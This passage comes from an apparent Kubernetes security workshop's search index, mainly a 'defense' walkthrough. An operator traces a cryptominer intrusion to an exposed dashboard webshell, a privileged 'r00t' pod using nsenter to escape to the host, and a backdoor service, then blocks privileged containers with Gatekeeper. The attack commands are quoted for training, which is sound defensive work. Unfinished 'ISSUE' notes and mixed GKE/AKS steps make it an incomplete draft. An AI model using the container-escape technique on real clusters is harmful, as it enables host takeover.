\"https://${EXTERNAL_IP}:31313\" get pods --all-namespaces\nfi\n</code></pre> <p>Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.</p>"},{"location":"scenario_2_defense/","title":"Persistence: Scenario 2 Defense","text":""},{"location":"scenario_2_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_2_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Still overworked</li> <li>Still can only do the bare minimum</li> <li>Uses the defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> </ul>"},{"location":"scenario_2_defense/#motivations","title":"Motivations","text":"<ul> <li>A week after the first incident, Blue gets paged at 3am because \u201cthe website is slow again\u201d.</li> <li>Blue, puzzled, takes another look.</li> <li>Blue decides to dust off the r\u00e9sum\u00e9 \u201cjust in case\u201d.</li> </ul>"},{"location":"scenario_2_defense/#defense","title":"Defense","text":"<p>Blue is paged again with the same message as last time. What is going on? Could this be the same problem again?</p>"},{"location":"scenario_2_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>Let's run some basic checks again to see if we can find random workloads:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>There does not appear to be any unusual workloads running on our cluster.</p> <p>Just to be sure, let's check our cluster's resource consumption:</p> <pre><code>kubectl top node\n</code></pre> <p>and</p> <pre><code>kubectl top pod --all-namespaces\n</code></pre> <p>So far, everything looks normal. What gives?</p> <p>Hold on. We installed <code>falco</code> last time and it is throwing us alerts in StackDriver.</p>"},{"location":"scenario_2_defense/#issue-how-to-do-in-log-analytics","title":"ISSUE How to do in Log Analytics?","text":"<p>Let's look the Events tile in the AKS resource.</p> <p></p> <p>Huh. This is odd. An unrecognized container, but no other information to go off of? </p> <p>Let's look at Azure Defender for Cloud</p> <p></p> <p>We can see that a privileged container was launched with the same name.</p> <p>ISSUE: THIS IS THE OLD CONTENT. It's got more details, but not sure of equivalent CLI/portal steps</p> <p>In a new StackDriver window, let's run the query:</p> <pre><code>resource.type=\"k8s_container\"\nresource.labels.container_name:\"falco\"\njsonPayload.rule=\"Launch Privileged Container\" OR jsonPayload.rule=\"Terminal shell in container\"\n</code></pre> <p>We're looking for <code>container</code> logs from <code>falco</code> where triggered rules are privileged containers or interactive shells.</p> <p>In a new StackDriver window, let's run this query:</p> <pre><code>resource.type=k8s_cluster\nprotoPayload.request.spec.containers.image=\"alpine\"\n</code></pre> <p>So, we see a few things:</p> <ol> <li>A create event that was authorized with the <code>system:serviceaccount:dev:default</code> serviceaccount in the <code>dev</code> namespace.</li> <li>A pod named <code>r00t</code> got created</li> <li>The pod command is <code>nsenter --mount=/proc/1/ns/mnt -- /bin/bash</code></li> <li>The <code>securityContext</code> is <code>privileged: true</code></li> <li>The <code>hostPID</code> is set to <code>true</code></li> </ol> <p>This is not looking good. Can we see what this container did?</p> <p>In a new StackDriver window, let's search for this <code>r00t</code> container logs:</p> <pre><code>resource.type=\"k8s_container\"\nresource.labels.pod_name:r00t\n</code></pre> <p>Wow. We can see someone was running commands from this container.</p> <p>But wait, they can run docker commands? How can they talk to the docker on the host from the container? OH NO! They must have broken out of the container and by this point they're on the host!</p> <p>That <code>bitcoinero</code> container again must be what's causing slowness. But, they're trying to do something else.</p> <p>They tried to create a pod, but failed. So, they created a Service and an Endpoint. They must be trying to open a backdoor of some sort to get back in later.</p> <p>In cloud shell, let's check if those exist:</p> <pre><code>kubectl -n kube-system get svc,ep\n</code></pre> <p>That's one sneaky hacker, for sure. But, jokes on them, We're not using service mesh.</p> <p>Let's delete that service (the endpoint will be deleted too):</p> <pre><code>kubectl -n kube-system delete svc/istio-mgmt\n</code></pre> <p>But, I want to know how did they get in in the first place?!?!?! The <code>create</code> event authorized because of the <code>dev:default</code> serviceaccount. So, what is in <code>dev</code> namespace that led to someone taking over the entire host?</p> <pre><code>kubectl -n dev get pods\n</code></pre> <p>There is an <code>app</code>, a <code>db</code>, and a <code>dashboard</code>. Wait a second! Could it be an exposed dashboard?</p> <pre><code>kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c dashboard\n</code></pre> <pre><code>kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c authproxy\n</code></pre> <p>It is an exposed dashboard. That's how they got in. There is <code>GET /webshell</code> in authproxy logs with the source IP.</p> <p>We might want to revoke that serviceaccount token: </p> <pre><code>kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default)\n</code></pre> <p>And perhaps disable the automatic mounting of serviceaccount tokens by setting <code>automountServiceAccountToken: false</code> in the pod spec, if the dashboard doesn't need it. </p> <p>But, how can we mitigate this further?</p> <p>The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller.</p> <p>That should work because an admission controller is a piece of code that intercepts requests to the Kubernetes API server after the request is authenticated and authorized.</p> <p></p> <p>So, we should set two policies:</p> <ol> <li>Deny privileged containers.</li> <li>Allow only the images we expect to have in <code>dev</code> and <code>prd</code> namespaces.</li> </ol> <p>First, let's apply Gatekeeper itself:</p> <pre><code>--enable-addons\naz aks enable-addons --addons azure-policy --name $AKS_NAME --resource-group $RESOURCE_GROUP\n\n# OLD COMMAND\n# kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml\n</code></pre> <p>Second, let's apply the policies. If you receive an error about <code>no matches for kind... in version ...</code>, this means Gatekeeper has not kicked into gear yet. Wait a few seconds then re-apply policies:</p> <pre><code># ISSUE: Must use Portal.  See: https://learn.microsoft.com/en-us/azure/governance/policy/concepts/policy-for-kubernetes#assign-a-policy-definition\n# ISSUE: Policies take take 20m to sync!\n# https://learn.microsoft.com/en-us/azure/aks/use-azure-policy#validate-an-azure-policy-is-running\n\n# OLD COMMAND\nkubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml\n</code></pre> <p>Let's see if this actually works by trying to run some containers that violate these policies.</p> <p>First, let's try to run privileged container:</p> <pre><code>kubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n    securityContext:\n      privileged: true\nEOF\n</code></pre> <p>We see that Kubernetes denied this request for 2 reasons (not whitelisted image and privileged), as expected.</p> <p>Let's try running a non-whitelisted image:</p> <pre><code>kubectl -n dev run alpine --image=alpine --restart=Never\n</code></pre> <p>We see that Kubernetes rejected this request again due to image not being whitelisted/allowed, as expected.</p> <p>Can we still run pods that meet/satisfy the Gatekeeper policies? Let's find out:</p> <pre><code>kubectl -n dev run ubuntu --image=ubuntu --restart=Never\n</code></pre> <p>Yes, looks like we can run pods that satisfy the policies and requirements we set on our cluster.</p> <p>Even though we applied Falco and Gatekeeper, we should not continue to use this cluster since it has been compromised. We should create a new cluster and re-deploy our applications there once we've hardened and secured it enough.</p>"},{"location":"wrapup/","title":"Wrap-up","text":"<p>Congrats! Remember to delete your project so it won't keep running and accruing charges!</p> <p>You can delete it through the web interface, or with the following gcloud command:</p> <pre><code>az group delete -n $RESOURCE_GROUP\n</code></pre>"}]}